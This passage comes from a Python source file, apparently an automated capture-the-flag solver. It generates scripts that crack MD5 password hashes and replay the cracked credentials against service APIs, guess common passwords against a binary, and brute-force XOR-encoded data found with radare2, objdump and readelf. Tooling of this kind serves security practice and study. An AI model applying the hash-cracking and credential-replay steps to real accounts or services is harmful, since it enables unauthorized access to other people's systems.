                    username = parts[0].split(':')[-1].strip()
                    password_hash = parts[1].strip()

                    # Try to crack the hash
                    if len(password_hash) == 32:  # MD5
                        cracked = crack_md5(password_hash)
                        if cracked:
                            for service in services:
                                flag = try_api_endpoints(service, username, cracked)
                                if flag:
                                    print(flag)
                                    exit(0)

            matches = re.findall(flag_pattern, decoded, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        print(match)
                        exit(0)
        except:
            pass

print("No flag found")
'''
        return script

    def _generate_binary_analysis_script(self, challenge: CTFChallengeClient, context: dict, tool_results: dict) -> str:
        """Generate a Python script for binary analysis and XOR decryption."""

        # Find the binary file
        binary_file = None
        for filename in tool_results.keys():
            if not filename.startswith('service_'):
                # Check if it's likely a binary
                file_info = tool_results[filename].get('file', '')
                if 'executable' in file_info.lower() or 'ELF' in file_info or not file_info:
                    binary_file = filename
                    break

        if not binary_file:
            # Fallback: look for any file that's not a README
            for filename in tool_results.keys():
                if not filename.startswith('service_') and 'README' not in filename.upper():
                    binary_file = filename
                    break

        if not binary_file:
            binary_file = "binary"

        script = f'''#!/usr/bin/env python3
import subprocess
import re
import os
import glob

flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

# Find the binary file
binary_files = glob.glob('*')
binary_path = None
for f in binary_files:
    if os.path.isfile(f) and not f.endswith('.txt') and not f.endswith('.md'):
        binary_path = f
        break

if not binary_path:
    binary_path = "{binary_file}"

# Make binary executable
os.chmod(binary_path, 0o755)

# Common passwords to try
common_passwords = [
    'password', 'admin', 'secret', 'flag', 'vault', 'unlock', '123456',
    'password123', 'qwerty', 'letmein', 'abc123', 'test', 'root'
]

# Try running the binary with common passwords
for password in common_passwords:
    try:
        result = subprocess.run([binary_path], input=password.encode(),
                              capture_output=True, text=True, timeout=5)
        output = result.stdout + result.stderr

        matches = re.findall(flag_pattern, output, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    exit(0)
    except:
        pass

# Extract the full binary data and try XOR decryption
try:
    with open(binary_path, 'rb') as f:
        binary_data = f.read()

    # Try XOR with all single-byte keys
    for key in range(1, 256):
        decrypted = bytes([b ^ key for b in binary_data]).decode('utf-8', errors='ignore')
        matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    exit(0)
except:
    pass

# Try using radare2 for analysis
try:
    # Extract all strings including data sections
    r2_commands = 'aaa;izz'  # Analyze all, list ALL strings
    r2_result = subprocess.run(
        ['r2', '-q', '-c', r2_commands, binary_path],
        capture_output=True, text=True, timeout=30
    )

    r2_output = r2_result.stdout

    # Try XOR on each string found
    for line in r2_output.split('\\n'):
        # Extract the actual string content (after address and size)
        parts = line.split()
        if len(parts) > 2:
            string_data = ' '.join(parts[2:])
            for key in range(1, 256):
                try:
                    decrypted = ''.join(chr(ord(c) ^ key) if ord(c) < 128 else '?'
                                       for c in string_data)
                    matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                    if matches:
                        for match in matches:
                            if '...' not in match and 'xxx' not in match.lower():
                                print(match)
                                exit(0)
                except:
                    pass

    # Extract hex data from radare2 output
    hex_matches = re.findall(r'0x([0-9a-fA-F]{{2,}})', r2_output)
    for hex_str in hex_matches:
        if len(hex_str) >= 16 and len(hex_str) % 2 == 0:  # Valid hex string
            try:
                data = bytes.fromhex(hex_str)
                for key in range(1, 256):
                    decrypted = bytes([b ^ key for b in data]).decode('utf-8', errors='ignore')
                    matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                    if matches:
                        for match in matches:
                            if '...' not in match and 'xxx' not in match.lower():
                                print(match)
                                exit(0)
            except:
                pass

except Exception as e:
    pass

# Try objdump to extract all sections including .rodata
try:
    objdump_result = subprocess.run(
        ['objdump', '-s', binary_path],
        capture_output=True, text=True, timeout=10
    )

    # Extract all hex data chunks from objdump output
    hex_chunks = []
    for line in objdump_result.stdout.split('\\n'):
        # Lines with hex data look like: " 401000 hexdata  ascii"
        if re.match(r'^\\s+[0-9a-f]+\\s+[0-9a-f]+', line):
            parts = line.split()
            if len(parts) >= 2:
                # Collect all hex columns (typically 4 columns of 8 hex digits)
                hex_data = ''.join(parts[1:5])
                if len(hex_data) >= 8:
                    hex_chunks.append(hex_data)

    # Now try XOR on collected hex chunks
    for hex_data in hex_chunks:
        try:
            data = bytes.fromhex(hex_data)
            # Try XOR with all single-byte keys
            for key in range(1, 256):
                decrypted = bytes([b ^ key for b in data]).decode('utf-8', errors='ignore')
                matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            exit(0)
        except:
            pass

    # Also try readelf to extract .rodata section specifically
    try:
        readelf_result = subprocess.run(
            ['readelf', '-x', '.rodata', binary_path],
            capture_output=True, text=True, timeout=10
        )

        # Parse readelf hex dump format
        for line in readelf_result.stdout.split('\\n'):
            # Format: "  0x00402010 5ac3119f 29f072ed 69b70000 00000000  Z...).r.i......."
            if re.match(r'^\\s+0x[0-9a-f]+\\s+', line):
                parts = line.split()
                if len(parts) >= 2:
                    hex_data = ''.join(parts[1:5])  # Get hex columns
                    try:
                        data = bytes.fromhex(hex_data)
                        for key in range(1, 256):
                            decrypted = bytes([b ^ key for b in data]).decode('utf-8', errors='ignore')
                            matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                            if matches:
                                for match in matches:
                                    if '...' not in match and 'xxx' not in match.lower():
                                        print(match)
                                        exit(0)
                    except:
                        pass
    except:
        pass
except:
    pass

# Fallback: regular strings command with XOR
try:
    strings_result = subprocess.run(['strings', binary_path], capture_output=True, text=True)
    strings_output = strings_result.stdout

    # Try XOR with all keys
    for key in range(1, 256):
        for line in strings_output.split('\\n'):
            try:
                decrypted = ''.join(chr(ord(c) ^ key) if ord(c) < 128 else '?' for c in line)
                matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            exit(0)
            except:
                pass
except:
    pass

print("No flag found")
'''
        return script
